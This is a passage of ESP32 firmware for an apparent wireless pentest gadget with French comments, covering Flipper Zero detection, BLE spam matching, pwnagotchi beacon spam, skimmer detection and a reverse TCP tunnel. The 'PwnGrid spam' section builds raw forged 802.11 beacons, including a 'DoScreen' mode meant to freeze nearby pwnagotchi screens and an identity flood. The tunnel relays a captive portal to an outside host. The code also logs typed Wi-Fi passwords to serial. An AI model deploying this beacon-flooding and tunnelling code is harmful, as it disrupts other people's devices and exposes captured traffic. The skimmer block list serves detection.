    uint8_t byteValue = strtoul(byteString, nullptr, 16);
    if (payload[j] != byteValue) return false;
  }
  return true;
}

class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    int lineCount = 0;
    const int maxLines = 10;

    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      String deviceColor = "Unknown";
      bool isValidMac = false;
      bool isFlipper = false;

      // Vérifier les UUIDs pour déterminer la couleur
      if (advertisedDevice.isAdvertisingService(BLEUUID("00003082-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "White";
        isFlipper = true;
      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003081-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "Black";
        isFlipper = true;
      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003083-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "Transparent";
        isFlipper = true;
      }

      // Continuer uniquement si un Flipper est identifié
      if (isFlipper) {
        String macAddress = advertisedDevice.getAddress().toString().c_str();
        if (macAddress.startsWith("80:e1:26") || macAddress.startsWith("80:e1:27") || macAddress.startsWith("0C:FA:22")) {
          isValidMac = true;
        }

        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.setCursor(0, 10);
        String name = advertisedDevice.getName().c_str();

        tft.printf("Name: %s\nRSSI: %d \nMAC: %s\n",
                   name.c_str(),
                   advertisedDevice.getRSSI(),
                   macAddress.c_str());
        recordFlipper(name, macAddress, deviceColor, isValidMac);
        lastFlipperFoundMillis = millis();
      }

      std::string advData = advertisedDevice.getManufacturerData();
      if (!advData.empty()) {
        const uint8_t* payload = reinterpret_cast<const uint8_t*>(advData.data());
        size_t length = advData.length();
        /*
                Serial.print("Raw Data: ");
                for (size_t i = 0; i < length; i++) {
                  Serial.printf("%02X", payload[i]); // Afficher chaque octet en hexadécimal
                }
                Serial.println(); // Nouvelle ligne après les données brutes*/

        for (auto& packet : forbiddenPackets) {
          if (matchPattern(packet.pattern, payload, length)) {
            if (lineCount >= maxLines) {
              tft.fillRect(0, 58, 325, 185, TFT_BLACK);
              tft.setCursor(0, 59);
              lineCount = 0;
            }
            tft.printf("%s\n", packet.type);
            lineCount++;
            break;
          }
        }
      }
    }
};



bool isMacAddressRecorded(const String & macAddress) {
  File file = SD.open("/WoF.txt", FILE_READ);
  if (!file) {
    return false;
  }
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.indexOf(macAddress) >= 0) {
      file.close();
      return true;
    }
  }

  file.close();
  return false;
}

void recordFlipper(const String & name, const String & macAddress, const String & color, bool isValidMac) {
  if (!isMacAddressRecorded(macAddress)) {
    File file = SD.open("/WoF.txt", FILE_APPEND);
    if (file) {
      String status = isValidMac ? " - normal" : " - spoofed"; // Détermine le statut basé sur isValidMac
      file.println(name + " - " + macAddress + " - " + color + status);
      Serial.println("Flipper saved: \n" + name + " - " + macAddress + " - " + color + status);
    }
    file.close();
  }
}

void initializeBLEIfNeeded() {
  if (!isBLEInitialized) {
    BLEDevice::init("");
    isBLEInitialized = true;
    Serial.println("BLE initialized for scanning.");
  }
}


void wallOfFlipper() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 10);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.println("Waiting for Flipper");

  initializeBLEIfNeeded();
  delay(200);
  screenDebounce();

  while (true) {
    esp_task_wdt_reset();  // Réinitialisation du watchdog
    vTaskDelay(pdMS_TO_TICKS(10));  // Petite pause pour permettre à d'autres tâches de s'exécuter

    // Vérification du temps écoulé depuis la dernière détection de Flipper
    if (millis() - lastFlipperFoundMillis > 10000) {
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(0, 10);
      tft.setTextSize(2);
      tft.setTextColor(TFT_WHITE);
      tft.println("Waiting for Flipper");

      lastFlipperFoundMillis = millis();  // Réinitialisation du compteur
    }

    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks(), true);
    pBLEScan->setActiveScan(true);
    pBLEScan->start(1, false);

    // Détection tactile pour arrêter la détection
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());
      if (y > tft.height() - 20) {
        waitAndReturnToMenu("Stop detection...");
        return;
      }
    }
  }
  waitAndReturnToMenu("Stop detection...");
}

// Wof part end




// Fonction pour se connecter au Wi-Fi
bool connectToWiFi(const String& ssid, const String& password) {
  WiFi.begin(ssid.c_str(), password.c_str());

  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 10);
  tft.println("Connecting to WiFi...");


  Serial.print("Connecting to SSID: ");
  Serial.println(ssid);

  int timeout = 10; // Timeout de 10 secondes pour la connexion
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(1000);
    timeout--;
    Serial.print(".");
  }
  Serial.println();

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("WiFi connected successfully!");
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 10);
    tft.println("Connected!");
    tft.setCursor(0, 30);
    tft.println("IP: " + WiFi.localIP().toString());

    delay(2000); // Affiche le message pendant 2 secondes
    return true;
  } else {
    Serial.println("Failed to connect to WiFi.");
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 10);
    tft.println("Failed to connect.");
    tft.setCursor(0, 30);
    tft.println("Please try again.");

    delay(2000); // Affiche le message pendant 2 secondes
    return false;
  }
}
// Fonction principale de connexion Wi-Fi
void connectWifi(int networkIndex) {
  Serial.println("Starting WiFi connection process...");
  screenDebounce();
  if (WiFi.localIP().toString() != "0.0.0.0") {
    if (confirmPopup("You want to disconnect ?")) {
      Serial.println("Disconnecting from current WiFi...");
      WiFi.disconnect(true);
      waitAndReturnToMenu("Disconnected");
      return;
    } else {
      waitAndReturnToMenu("Stay connected...");
      return;
    }
  }

  String nameSSID = ssidList[networkIndex];
  String typedPassword = "";

  Serial.print("Selected network SSID: ");
  Serial.println(nameSSID);

  // Si le réseau est ouvert, passer directement à la connexion
  if (getWifiSecurity(networkIndex) == "Open") {
    Serial.println("Network is open, no password required.");
    if (connectToWiFi(nameSSID, "")) {
      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
      ssid = nameSSID; // Stocke le SSID sélectionné
    } else {
      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
    }
    return;
  }

  // Demander le mot de passe pour les réseaux sécurisés
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 10);
  tft.println("Enter Password for " + nameSSID);
  delay(2000);

  // Appel à la fonction getUserInput pour obtenir le mot de passe
  typedPassword = getUserInput();

  if (typedPassword.length() > 0) {
    Serial.print("Attempting to connect to WiFi with password: ");
    Serial.println(typedPassword);

    if (connectToWiFi(nameSSID, typedPassword)) {
      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
      ssid = nameSSID; // Stocke le SSID sélectionné
      password = typedPassword;
    } else {
      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
    }
  } else {
    waitAndReturnToMenu("Password entry canceled.");
  }
}

// pwngridspam



// Global flag to control the spam task
volatile bool spamRunning = false;
volatile bool stop_beacon = false;
volatile bool dos_pwnd = false;
volatile bool change_identity = false;

// Global arrays to hold the faces and names
const char* faces[30];  // Increase size if needed
const char* names[30];  // Increase size if needed
int num_faces = 0;
int num_names = 0;

// Forward declarations
void displaySpamStatus();
void returnToMenu();
void loadFacesAndNames();

// Définir la trame beacon brute
const uint8_t beacon_frame_template[] = {
  0x80, 0x00,                          // Frame Control
  0x00, 0x00,                          // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination Address (Broadcast)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Source Address (SA)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // BSSID
  0x00, 0x00,                          // Sequence/Fragment number
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,  // Beacon interval
  0x11, 0x04   // Capability info
};


// Function to generate a random string that resembles a SHA-256 hash
String generate_random_identity() {
  const char hex_chars[] = "0123456789abcdef";
  String random_identity = "";
  for (int i = 0; i < 64; ++i) {
    random_identity += hex_chars[random(0, 16)];
  }
  return random_identity;
}

void send_pwnagotchi_beacon(uint8_t channel, const char* face, const char* name) {
  DynamicJsonDocument json(2048);
  json["pal"] = true;
  json["name"] = name;
  json["face"] = face; // change to {} to freeze the screen
  json["epoch"] = 1;
  json["grid_version"] = "1.10.3";
  if (change_identity) {
    json["identity"] = generate_random_identity();
  } else {
    json["identity"] = "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610";
  }
  json["pwnd_run"] = 0;
  json["pwnd_tot"] = 0;
  json["session_id"] = "a2:00:64:e6:0b:8b";
  json["timestamp"] = 0;
  json["uptime"] = 0;
  json["version"] = "1.8.4";
  json["policy"]["advertise"] = true;
  json["policy"]["bond_encounters_factor"] = 20000;
  json["policy"]["bored_num_epochs"] = 0;
  json["policy"]["sad_num_epochs"] = 0;
  json["policy"]["excited_num_epochs"] = 9999;

  String json_str;
  serializeJson(json, json_str);

  uint16_t json_len = json_str.length();
  uint8_t header_len = 2 + ((json_len / 255) * 2);
  uint8_t beacon_frame[sizeof(beacon_frame_template) + json_len + header_len];
  memcpy(beacon_frame, beacon_frame_template, sizeof(beacon_frame_template));

  // Ajout des données JSON à la trame beacon
  int frame_byte = sizeof(beacon_frame_template);
  for (int i = 0; i < json_len; i++) {
    if (i == 0 || i % 255 == 0) {
      beacon_frame[frame_byte++] = 0xde;  // AC = 222
      uint8_t payload_len = 255;
      if (json_len - i < 255) {
        payload_len = json_len - i;
      }
      beacon_frame[frame_byte++] = payload_len;
    }
    beacon_frame[frame_byte++] = (uint8_t)json_str[i];
  }

  // Définir le canal et envoyer la trame
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
}

const char* pwnd_faces[] = {
  "NOPWND!■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■\n■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
};
const char* pwnd_names[] = {
  "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
};

// Tâche pour envoyer des trames beacon avec changement de face, de nom et de canal
void beacon_task(void* pvParameters) {
  const uint8_t channels[] = {1, 6, 11};  // Liste des canaux Wi-Fi à utiliser
  const int num_channels = sizeof(channels) / sizeof(channels[0]);
  const int num_pwnd_faces = sizeof(pwnd_faces) / sizeof(pwnd_faces[0]);

  while (spamRunning) {
    if (dos_pwnd) {
      // Send PWND beacons
      for (int ch = 0; ch < num_channels; ++ch) {
        if (stop_beacon) {
          break;
        }
        send_pwnagotchi_beacon(channels[ch], pwnd_faces[0], pwnd_names[0]);
        vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
      }
    } else {
      // Send regular beacons
      for (int i = 0; i < num_faces; ++i) {
        for (int ch = 0; ch < num_channels; ++ch) {
          if (stop_beacon) {
            break;
          }
          send_pwnagotchi_beacon(channels[ch], faces[i], names[i % num_names]);
          vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
        }
      }
    }
  }

  vTaskDelete(NULL);
}

void displaySpamStatus() {
  screenDebounce();
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  tft.setCursor(0, 10);
  tft.println("PwnGrid Spam Running...");

  int current_face_index = 0;
  int current_name_index = 0;
  int current_channel_index = 0;
  const uint8_t channels[] = {1, 6, 11};
  const int num_channels = sizeof(channels) / sizeof(channels[0]);

  while (spamRunning) {
    esp_task_wdt_reset();
    TouchPoint touch = ts.getTouch();

    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (x < tft.width() / 3) {
        dos_pwnd = !dos_pwnd;
        Serial.printf("DoScreen %s.\n", dos_pwnd ? "enabled" : "disabled");
      } else if (x > 2 * (tft.width() / 3)) {
        // Zone de droite - Changer d'identité
        change_identity = !change_identity;
        Serial.printf("Change Identity %s.\n", change_identity ? "enabled" : "disabled");
      } else {
        // Zone centrale
        if (y < tft.height() / 2) {
          spamRunning = false;
          waitAndReturnToMenu("Back to menu");
          break;
        }
      }
    }

    // Affichage des informations actuelles
    tft.setCursor(20, 30);
    tft.printf("Flood: %s", change_identity ? "1" : "0");
    tft.setCursor(150, 30);
    tft.printf("DoScreen: %s", dos_pwnd ? "1" : "0");

    if (!dos_pwnd) {
      tft.setCursor(0, 50);
      tft.printf("Face: \n%s                                              ", faces[current_face_index]);
      tft.setCursor(0, 90);
      tft.printf("Name:                  \n%s                                              ", names[current_name_index]);
    } else {
      tft.setCursor(0, 50);
      tft.printf("Face:\nNOPWND!■■■■■■■■■■■■■■■■■");
      tft.setCursor(0, 90);
      tft.printf("Name:\n■■■■■■■■■■■■■■■■■■■■■■");
    }
    tft.setCursor(0, 140);
    tft.printf("Channel: %d  ", channels[current_channel_index]);

    // Mettre à jour les index pour le prochain affichage
    current_face_index = (current_face_index + 1) % num_faces;
    current_name_index = (current_name_index + 1) % num_names;
    current_channel_index = (current_channel_index + 1) % num_channels;

    delay(200); // Mettre à jour l'affichage toutes les 200 ms
  }
}


void loadFacesAndNames() {
  File file = SD.open("/config/pwngridspam.txt");
  if (!file) {
    Serial.println("Failed to open file for reading");
    return;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("faces=")) {
      String faces_line = line.substring(6);
      faces_line.replace("\"", "");  // Remove quotes
      faces_line.trim();  // Remove leading/trailing whitespace
      faces_line.replace("\\n", "\n");  // Handle newline characters
      int start = 0;
      int end = faces_line.indexOf(',', start);
      num_faces = 0;
      while (end != -1) {
        faces[num_faces++] = strdup(faces_line.substring(start, end).c_str());
        start = end + 1;
        end = faces_line.indexOf(',', start);
      }
      faces[num_faces++] = strdup(faces_line.substring(start).c_str());
    } else if (line.startsWith("names=")) {
      String names_line = line.substring(6);
      names_line.replace("\"", "");  // Remove quotes
      names_line.trim();  // Remove leading/trailing whitespace
      int start = 0;
      int end = names_line.indexOf(',', start);
      num_names = 0;
      while (end != -1) {
        names[num_names++] = strdup(names_line.substring(start, end).c_str());
        start = end + 1;
        end = names_line.indexOf(',', start);
      }
      names[num_names++] = strdup(names_line.substring(start).c_str());
    }
  }
  file.close();
}

extern "C" void send_pwnagotchi_beacon_main() {
  // Initialiser NVS
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // Initialiser la configuration Wi-Fi
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_start());

  // Load faces and names from the file
  loadFacesAndNames();

  // Set the spamRunning flag to true
  spamRunning = true;

  // Créer la tâche beacon
  xTaskCreate(&beacon_task, "beacon_task", 4096, NULL, 5, NULL);

  // Display the spam status and wait for user input
  displaySpamStatus();
}

// pwngridspam end




// detectskimmer

// Skimmer Detection Adaptée pour utilisation tactile

BLEScan* pBLEScan;
bool isScanning = false;
bool skimmerDetected = false;
bool isBLEScanning = false;
String skimmerInfo;

const char* badDeviceNames[] = {"HC-03", "HC-05", "HC-06", "HC-08", "BT04-A", "BT05"};
const int badDeviceNamesCount = sizeof(badDeviceNames) / sizeof(badDeviceNames[0]);

const char* badMacPrefixes[] = {"00:11:22", "00:18:E4", "20:16:04"};
const int badMacPrefixesCount = sizeof(badMacPrefixes) / sizeof(badMacPrefixes[0]);

unsigned long lastUpdate = 0;
const unsigned long refreshInterval = 500;

class SkimmerAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  public:
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      bool isSkimmerDetected = false;
      String displayMessage;

      std::string deviceAddress = advertisedDevice.getAddress().toString();
      std::string deviceName = advertisedDevice.getName();
      int rssi = advertisedDevice.getRSSI();

      // Vérifier si le nom du périphérique correspond à un skimmer connu
      for (int i = 0; i < badDeviceNamesCount; i++) {
        if (deviceName == badDeviceNames[i]) {
          isSkimmerDetected = true;
          break;
        }
      }

      // Vérifier le préfixe de l'adresse MAC
      for (int i = 0; i < badMacPrefixesCount && !isSkimmerDetected; i++) {
        if (deviceAddress.substr(0, 8) == badMacPrefixes[i]) {
          isSkimmerDetected = true;
          break;
        }
      }

      // Construction du message d'affichage
      displayMessage = "____________________\n\n";
      displayMessage += "Device: \n";
      displayMessage += deviceName.length() != 0 ? deviceName.c_str() : deviceAddress.c_str();
      displayMessage += "\n\n";
      displayMessage += "RSSI: " + String(rssi) + "\n";
      displayMessage += "Skimmer: " + String(isSkimmerDetected ? "Probable" : "No");
      displayMessage += "\n____________________";

      Serial.println(displayMessage);

      // Affichage sur l'écran si nécessaire
      unsigned long currentTime = millis();
      if (currentTime - lastUpdate >= refreshInterval) {
        lastUpdate = currentTime;
        tft.fillScreen(TFT_BLACK);
        tft.setTextSize(2);
        tft.setCursor(0, 0);
        tft.setTextColor(isSkimmerDetected ? TFT_RED : menuTextUnFocusedColor);
        tft.println(displayMessage);
      }

      // Détection et sonnerie si un skimmer est trouvé
      if (isSkimmerDetected && !skimmerDetected) {
        skimmerDetected = true;
        skimmerInfo = displayMessage;
      }
    }
};

void skimmerDetection() {
  if (!BLEDevice::getInitialized()) {
    BLEDevice::init("");
  }

  if (pBLEScan != nullptr) {
    if (isBLEScanning) {
      pBLEScan->stop();
      isBLEScanning = false;
    }
    pBLEScan->clearResults();
  }

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new SkimmerAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(1349);
  pBLEScan->setWindow(449);

  tft.fillScreen(menuBackgroundColor);
  tft.setTextSize(2);
  tft.setTextColor(menuTextUnFocusedColor);
  tft.setCursor(0, 0);
  tft.println("Scanning for Skimmers...");

  isScanning = true;
  skimmerDetected = false;
  skimmerInfo = "";

  pBLEScan->start(0, nullptr, false);
  isBLEScanning = true;
  screenDebounce();

  while (isScanning) {
    esp_task_wdt_reset();
    TouchPoint touch = ts.getTouch();

    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (x < tft.width() / 3) {
        // Zone gauche pour arrêter le scan
        if (pBLEScan != nullptr && isBLEScanning) {
          pBLEScan->stop();
          isBLEScanning = false;
        }
        isScanning = false;
        waitAndReturnToMenu("Scan Stopped");
        return;
      }
    }

    if (skimmerDetected) {
      if (pBLEScan != nullptr && isBLEScanning) {
        pBLEScan->stop();
        isBLEScanning = false;
      }
      isScanning = false;

      tft.fillScreen(TFT_BLACK);
      tft.setTextSize(2);
      tft.setCursor(0, 0);
      tft.setTextColor(TFT_RED);
      tft.println(skimmerInfo);


      while (true) {
        esp_task_wdt_reset();
        touch = ts.getTouch();
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());
        if (touch.zRaw != 0 && x < tft.width() / 3) {
          waitAndReturnToMenu("Skimmer Detected - Caution");
          return;
        }
        delay(100);
      }
    }
    delay(100);
  }
}



// detectskimmer end


bool connectWithTimeout(WiFiClient& client, IPAddress ip, uint16_t port, uint32_t timeout_ms) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    return false;
  }

  struct sockaddr_in server;
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = ip;

  int flags = fcntl(sock, F_GETFL, 0);
  fcntl(sock, F_SETFL, flags | O_NONBLOCK);

  int res = connect(sock, (struct sockaddr*)&server, sizeof(server));
  if (res < 0) {
    if (errno != EINPROGRESS) {
      close(sock);
      return false;
    }
  }

  fd_set fdset;
  FD_ZERO(&fdset);
  FD_SET(sock, &fdset);
  struct timeval tv;
  tv.tv_sec = timeout_ms / 1000;
  tv.tv_usec = (timeout_ms % 1000) * 1000;

  res = select(sock + 1, NULL, &fdset, NULL, &tv);
  if (res <= 0) {
    close(sock);
    return false;
  }

  int so_error;
  socklen_t len = sizeof(so_error);
  getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
  if (so_error != 0) {
    close(sock);
    return false;
  }

  client = WiFiClient(sock);
  return true;
}

void displayResults(int displayStart, int maxLines, const std::vector<String>& scanResults);

void displayResults(int displayStart, int maxLines, const std::vector<String>& scanResults) {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);

  int totalLines = scanResults.size();
  int endLine = std::min(displayStart + maxLines, totalLines);

  for (int i = displayStart; i < endLine; i++) {
    tft.println(scanResults[i]); // Pas besoin de conversion
  }
}


bool handleScrolling(int& displayStart, int maxLines, int totalLines) {
  int previousDisplayStart = displayStart;

  // Détection tactile pour le défilement
  TouchPoint touch = ts.getTouch();
  if (touch.zRaw != 0) {
    int x = map(touch.xRaw, minX, maxX, 0, tft.width());
    int y = map(touch.yRaw, minY, maxY, 0, tft.height());

    if (x < tft.width() / 3) {
      // Zone de gauche - Défilement vers le haut
      displayStart = max(0, displayStart - 1);
      Serial.println("Scrolling up");
      delay(30);
    } else if (x > 2 * (tft.width() / 3)) {
      // Zone de droite - Défilement vers le bas
      displayStart = min(displayStart + 1, max(0, totalLines - maxLines));
      Serial.println("Scrolling down");
      delay(30);
    }
  }

  return displayStart != previousDisplayStart;
}


bool isBackspacePressed() {
  TouchPoint touch = ts.getTouch();
  if (touch.zRaw != 0) {
    int x = map(touch.xRaw, minX, maxX, 0, tft.width());
    int y = map(touch.yRaw, minY, maxY, 0, tft.height());

    // Vérifier si l'utilisateur a appuyé sur la zone de retour (en bas de l'écran)
    if (y > tft.height() - 20) {
      Serial.println("Retour détecté via l'écran tactile, retour au menu.");
      return true;
    }
  }
  return false;
}

void reverseTCPTunnel() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  if (tcp_host == "") {
    waitAndReturnToMenu("Error check tcp_host in config file");
    return;
  }

  createCaptivePortal();

  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setCursor(20, tft.height() / 2);
  tft.println("Attempting to connect...");

  WiFiClient client;
  bool running = true;
  unsigned long previousAttemptTime = 0;
  const unsigned long attemptInterval = 5000;
  bool attemptingConnection = true;

  while (running) {
    handleDnsRequestSerial();

    // Vérifier le retour au menu via l'écran tactile
    if (isBackspacePressed()) {
      running = false;
      tft.fillScreen(TFT_BLACK);
      tft.setCursor(20, tft.height() / 2);
      tft.println("Returning to menu...");
      break;
    }

    if (millis() - previousAttemptTime >= attemptInterval) {
      previousAttemptTime = millis();

      if (client.connect(tcp_host.c_str(), tcp_port)) {
        tft.fillScreen(TFT_BLACK);
        tft.setCursor(20, tft.height() / 2);
        tft.println("Connection established.");
        attemptingConnection = false;
      } else {
        if (WiFi.status() != WL_CONNECTED) {
          WiFi.begin(ssid, password);
        }
        tft.fillScreen(TFT_BLACK);
        tft.setCursor(20, tft.height() / 2);
        tft.println("Trying to connect...");
      }
    }
  }

  if (!running) return;

  tft.fillScreen(TFT_BLACK);
  tft.setCursor(30, tft.height() / 2);
  tft.println("TCP tunnel Connected.");

  while (client.connected() && running) {
    handleDnsRequestSerial();
    handleDataTransfer(client);
    delay(10);

    // Vérifier le retour au menu via l'écran tactile
    if (isBackspacePressed()) {
      running = false;
      break;
    }
  }

  client.stop();
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(20, tft.height() / 2);
  tft.println("Connection closed.");
  delay(1000);
  waitAndReturnToMenu("Return to menu.");
}

void handleDataTransfer(WiFiClient & client) {
  if (client.available()) {
    Serial.println("Data received from server, connecting to local web server...");
    WiFiClient localClient;
    if (!localClient.connect("127.0.0.1", 80)) {
      Serial.println("Failed to connect to local web server on port 80.");
      return;
    }
    Serial.println("Connected to local web server on port 80.");

    String request = "";
    unsigned long reqTimeout = millis();
    const int bufferSize = 1024;
    char buffer[bufferSize + 1];
    bool headersReceived = false;
    int contentLength = 0;

    while (client.connected() && (millis() - reqTimeout < 20000)) {
      handleDnsRequestSerial();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = client.available();
      if (len > 0) {
        if (len > bufferSize) len = bufferSize;
        int readLen = client.readBytes(buffer, len);
        buffer[readLen] = '\0';
        request += buffer;
        reqTimeout = millis();
        if (request.indexOf("\r\n\r\n") != -1) {
          headersReceived = true;
          break;
        }
      }
      delay(1);
    }

    if (!headersReceived) {
      Serial.println("Timeout or incomplete headers received from client.");
      client.stop();
      localClient.stop();
      return;
    }

    int contentLengthIndex = request.indexOf("Content-Length: ");
    if (contentLengthIndex != -1) {
      int endOfContentLength = request.indexOf("\r\n", contentLengthIndex);
      String contentLengthValue = request.substring(contentLengthIndex + 16, endOfContentLength);
      contentLength = contentLengthValue.toInt();
    }

    int headersEndIndex = request.indexOf("\r\n\r\n") + 4;
    int bodyBytesRead = request.length() - headersEndIndex;

    while (bodyBytesRead < contentLength && (millis() - reqTimeout < 20000)) {
      handleDnsRequestSerial();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = client.available();
      if (len > 0) {
        if (len > bufferSize) len = bufferSize;
        int readLen = client.readBytes(buffer, len);
        buffer[readLen] = '\0';
        request += buffer;
        bodyBytesRead += readLen;
        reqTimeout = millis();
      }
      delay(1);
    }

    if (bodyBytesRead < contentLength) {
      Serial.println("Timeout or incomplete request body received from client.");
      client.stop();
      localClient.stop();
      return;
    }

    int hostIndex = request.indexOf("Host: ");
    if (hostIndex != -1) {
      int endOfHost = request.indexOf("\r\n", hostIndex);
      if (endOfHost != -1) {
        request = request.substring(0, hostIndex) + "Host: 127.0.0.1:80" + request.substring(endOfHost);
      }
    }

    localClient.print(request);

    Serial.println("Waiting for response from local web server...");
    unsigned long respTimeout = millis();
    const int responseBufferSize = 1024;
    uint8_t responseBuffer[responseBufferSize];
    while (localClient.connected() || localClient.available()) {
      handleDnsRequestSerial();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = localClient.available();
      if (len > 0) {
        if (len > responseBufferSize) len = responseBufferSize;
        int readLen = localClient.read(responseBuffer, len);
        client.write(responseBuffer, readLen);
        Serial.write(responseBuffer, readLen);
        respTimeout = millis();
      } else if (millis() - respTimeout > 2000) {
        Serial.println("Timeout while reading response from local web server.");
        break;
      }
      delay(1);
    }
    localClient.stop();
    Serial.println("Connection to local web server closed.");
  }
  delay(10);
}


String getUserInput() {
  // Define keyboard layers with character keys only
  const char* lowercaseKeys[] = {
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "a", "s", "d", "f", "g", "h", "j", "k", "l",
    "z", "x", "c", "v", "b", "n", "m", ",", "."
  };

  const char* uppercaseKeys[] = {
    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
    "A", "S", "D", "F", "G", "H", "J", "K", "L",
    "Z", "X", "C", "V", "B", "N", "M", "<", ">"
  };

  const char* specialKeys[] = {
    "[", "]", "{", "}", "\\", "|", ";", ":", "'", "\"",
    "<", ">", "/", "?", "`", "~", "-", "=", "+", "_",
    "!", "@", "#", "$", "%", "^", "&", "*", "(",
    ")", ",", ".", "/", "?", "!", "\"", "'"
  };

  const int numKeys = sizeof(lowercaseKeys) / sizeof(lowercaseKeys[0]); // Ensure consistent key count
  String inputText = "";
  bool done = false;
  const char** currentKeys = lowercaseKeys; // Start with lowercase letters
  bool shiftOn = false;
  bool specialOn = false;

  // Display setup
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(2);

  // Function to draw the main keyboard keys
  auto drawKeyboard = [&](const char** keys) {
    // Clear previous keys
    tft.fillRect(0, 60, tft.width(), tft.height() - 120, TFT_BLACK); // Adjusted height
    int keyWidth = tft.width() / 10;
    int keyHeight = 30;
    for (int i = 0; i < numKeys; i++) {
      int x = (i % 10) * keyWidth;
      int y = (i / 10) * keyHeight + 60; // Offset to leave space for input display
      tft.drawRect(x, y, keyWidth, keyHeight, TFT_WHITE);
      tft.setCursor(x + 8, y + 8);
      tft.print(keys[i]);
    }
  };

  // Define function keys with full labels
  const char* functionKeys[] = { "Shift", "Sym", "Space", "Del", "Menu", "OK" };
  const int numFunctionKeys = sizeof(functionKeys) / sizeof(functionKeys[0]);

  // Function to draw the function keys
  auto drawFunctionKeys = [&]() {
    int functionKeyHeight = 40; // Height of function keys
